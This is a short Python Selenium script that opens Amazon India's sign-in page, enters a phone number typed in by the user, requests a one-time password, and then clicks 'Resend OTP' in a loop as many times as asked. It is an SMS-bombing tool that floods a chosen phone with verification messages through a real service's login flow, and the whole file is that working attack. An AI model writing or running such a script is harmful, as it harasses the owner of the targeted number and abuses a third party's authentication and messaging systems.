from selenium import webdriver
browser = webdriver.Chrome("C:\\chromedriver\\chromedriver.exe")

browser.get('https://www.amazon.in/ap/signin?ie=UTF8&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&switch_account=signin&ignoreAuthState=1&disableLoginPrepopulate=1&ref_=ap_sw_aa')


number = input("Enter number")
times = int(input("Enter of times you want to send the message"))

user_number = browser.find_element_by_id('ap_email')
conti = browser.find_element_by_id('continue')

user_number.send_keys(number)
conti.click()

sendOTP = browser.find_element_by_id('continue')
sendOTP.click()
    
while(times):
    r = browser.find_element_by_link_text("Resend OTP")
    r.click()
    times = times-1
